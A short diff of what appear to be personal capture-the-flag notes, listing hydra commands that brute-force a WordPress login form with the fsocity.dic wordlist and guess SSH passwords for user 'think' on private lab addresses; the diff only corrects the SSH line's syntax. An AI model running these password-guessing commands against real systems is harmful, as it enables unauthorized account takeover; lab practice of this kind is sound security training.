@@ -2,4 +2,4 @@ hydra -L fsocity.dic -p test 10.10.66.104 http-post-form "/wp-login.php:log=^USE
 
 hydra -l Elliot -P fsocity.dic 10.10.66.104 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username" -t 30 
 
-hydra -l think -P /home/mystic/Downloads/test/htb/password.txt  -t 4 ssh://10.10.62.113  (ssh)
+hydra -l think -P /home/mystic/Downloads/test/htb/password.txt 10.10.62.113 ssh
